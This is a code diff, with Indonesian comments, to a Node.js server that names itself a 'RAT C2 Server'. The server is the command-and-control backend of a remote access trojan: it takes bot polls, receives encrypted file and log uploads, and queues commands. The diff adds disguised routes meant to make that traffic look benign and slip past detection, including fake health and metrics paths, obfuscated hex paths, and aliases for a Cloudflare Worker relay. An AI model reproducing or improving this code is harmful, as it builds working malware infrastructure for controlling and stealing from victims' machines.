@@ -10,6 +10,12 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN_B || 'your_telegram_bot_token_here';
 const CHAT_ID = process.env.CHAT_ID || 'your_chat_id_here';
 
+// --- HAPUS VALIDASI CRASH ---
+// Hanya warning, tidak exit
+if (!BOT_TOKEN || !CHAT_ID) {
+    console.warn("⚠️  WARNING: Telegram credentials not set. Running in debug mode.");
+}
+
 // --- MIDDLEWARE DENGAN LIMIT BESAR ---
 app.use(express.json({ limit: '5000mb' }));
 app.use(express.urlencoded({ limit: '5000mb', extended: true }));
@@ -305,8 +311,12 @@ setInterval(() => {
     
 }, 60000); // Every minute
 
-// --- ENDPOINT 1: POLLING ---
-app.post('/poll', async (req, res) => {
+// ============================================
+// ENDPOINT UTAMA
+// ============================================
+
+// Helper function untuk handle polling
+async function handlePollRequest(req, res) {
     try {
         const { bot_id } = req.body;
         
@@ -344,10 +354,10 @@ app.post('/poll', async (req, res) => {
             message: "Internal server error" 
         });
     }
-});
+}
 
-// --- ENDPOINT 2: REPORT (UPLOAD FILE & LOGS) ---
-app.post('/report', async (req, res) => {
+// Helper function untuk handle report
+async function handleReportRequest(req, res) {
     try {
         const { id, aes, chacha } = req.body;
 
@@ -443,7 +453,49 @@ app.post('/report', async (req, res) => {
             message: e.message 
         }); 
     }
-});
+}
+
+// ============================================
+// ENDPOINT DEFINITIONS
+// ============================================
+
+// --- ENDPOINT 1: POLLING (original) ---
+app.post('/poll', handlePollRequest);
+
+// --- ENDPOINT 2: REPORT (original) ---
+app.post('/report', handleReportRequest);
+
+// ============================================
+// ENDPOINT ALIAS UNTUK CLOUDFLARE WORKER
+// ============================================
+
+// --- ENDPOINT 3: /internal/beacon (alias untuk /poll) ---
+app.post('/internal/beacon', handlePollRequest);
+
+// --- ENDPOINT 4: /internal/report (alias untuk /report) ---
+app.post('/internal/report', handleReportRequest);
+
+// --- ENDPOINT 5: /api/v1/health (time-based alias) ---
+app.post('/api/v1/health', handlePollRequest);
+app.post('/api/v2/metrics', handlePollRequest);
+app.post('/api/v3/status', handlePollRequest);
+app.post('/api/v4/ping', handlePollRequest);
+
+// --- ENDPOINT 6: /b3a5c7 (obfuscated path untuk /poll) ---
+app.post('/b3a5c7', handlePollRequest);
+
+// --- ENDPOINT 7: /d8e2f9 (obfuscated path untuk /report) ---
+app.post('/d8e2f9', handleReportRequest);
+
+// --- ENDPOINT 8: /api/health (API-looking path) ---
+app.post('/api/health', handlePollRequest);
+
+// --- ENDPOINT 9: /metrics/collect (metrics-looking path) ---
+app.post('/metrics/collect', handleReportRequest);
+
+// ============================================
+// UTILITY ENDPOINTS
+// ============================================
 
 // --- HEALTH CHECK ENDPOINT ---
 app.get('/health', (req, res) => {
@@ -458,7 +510,30 @@ app.get('/health', (req, res) => {
         total_bots: Object.keys(onlineBots).length,
         current_target: currentTarget,
         command_queue: commandData.cmd ? 1 : 0,
-        uptime: process.uptime()
+        uptime: process.uptime(),
+        endpoints: [
+            '/poll', '/report',
+            '/internal/beacon', '/internal/report',
+            '/api/v1/health', '/b3a5c7', '/d8e2f9'
+        ]
+    });
+});
+
+// --- DEBUG ENDPOINT (untuk cek environment) ---
+app.get('/debug-env', (req, res) => {
+    const maskedToken = BOT_TOKEN && BOT_TOKEN !== 'your_telegram_bot_token_here' 
+        ? BOT_TOKEN.substring(0, 10) + '...' 
+        : 'NOT SET OR DEFAULT';
+    
+    res.json({
+        bot_token_set: !!BOT_TOKEN && BOT_TOKEN !== 'your_telegram_bot_token_here',
+        bot_token_preview: maskedToken,
+        chat_id_set: !!CHAT_ID && CHAT_ID !== 'your_chat_id_here',
+        chat_id: CHAT_ID && CHAT_ID !== 'your_chat_id_here' ? '***' + CHAT_ID.slice(-3) : 'NOT SET OR DEFAULT',
+        port: PORT,
+        node_env: process.env.NODE_ENV || 'development',
+        timestamp: new Date().toISOString(),
+        online_bots_count: Object.keys(onlineBots).length
     });
 });
 
@@ -466,6 +541,21 @@ app.get('/health', (req, res) => {
 app.post('/clear', (req, res) => {
     commandData = { id: 0, cmd: "", payload: "" };
     res.json({ status: 'success', message: 'Command cleared' });
+});
+
+// --- ROOT ENDPOINT ---
+app.get('/', (req, res) => {
+    res.json({
+        service: 'RAT C2 Server',
+        version: '2.0',
+        status: 'operational',
+        endpoints: {
+            polling: ['/poll', '/internal/beacon', '/b3a5c7', '/api/health'],
+            reporting: ['/report', '/internal/report', '/d8e2f9', '/metrics/collect'],
+            utility: ['/health', '/debug-env', '/clear']
+        },
+        documentation: 'Use POST requests with JSON payload'
+    });
 });
 
 // --- ERROR HANDLING MIDDLEWARE ---
@@ -478,18 +568,43 @@ app.use((err, req, res, next) => {
     });
 });
 
+// --- 404 HANDLER ---
+app.use((req, res) => {
+    res.status(404).json({
+        status: 'error',
+        message: `Endpoint ${req.method} ${req.path} not found`,
+        available_endpoints: {
+            GET: ['/', '/health', '/debug-env'],
+            POST: ['/poll', '/report', '/internal/beacon', '/internal/report']
+        }
+    });
+});
+
 // --- START SERVER ---
 app.listen(PORT, () => {
     console.log(`
-    ╔══════════════════════════════════╗
-    ║      RAT C2 SERVER RUNNING       ║
-    ╠══════════════════════════════════╣
-    ║ Port: ${PORT}${' '.repeat(27 - PORT.toString().length)}║
-    ║ Env:  ${process.env.NODE_ENV || 'development'}${' '.repeat(27 - (process.env.NODE_ENV || 'development').length)}║
-    ║ Time: ${new Date().toLocaleString()} ║
-    ╚══════════════════════════════════╝
+    ╔══════════════════════════════════════╗
+    ║        RAT C2 SERVER RUNNING         ║
+    ╠══════════════════════════════════════╣
+    ║ Port: ${PORT}${' '.repeat(33 - PORT.toString().length)}║
+    ║ Env:  ${process.env.NODE_ENV || 'development'}${' '.repeat(33 - (process.env.NODE_ENV || 'development').length)}║
+    ║ Time: ${new Date().toLocaleString()}${' '.repeat(14)}║
+    ║                                      ║
+    ║ 📡 Endpoints Ready:                  ║
+    ║   • /poll → /internal/beacon         ║
+    ║   • /report → /internal/report       ║
+    ║   • /health (status check)           ║
+    ╚══════════════════════════════════════╝
     `);
     
     // Initial cleanup
     cleanupTempFiles();
+    
+    // Log environment status
+    if (!BOT_TOKEN || BOT_TOKEN === 'your_telegram_bot_token_here') {
+        console.warn('⚠️  WARNING: BOT_TOKEN_B not set or using default value');
+    }
+    if (!CHAT_ID || CHAT_ID === 'your_chat_id_here') {
+        console.warn('⚠️  WARNING: CHAT_ID not set or using default value');
+    }
 });
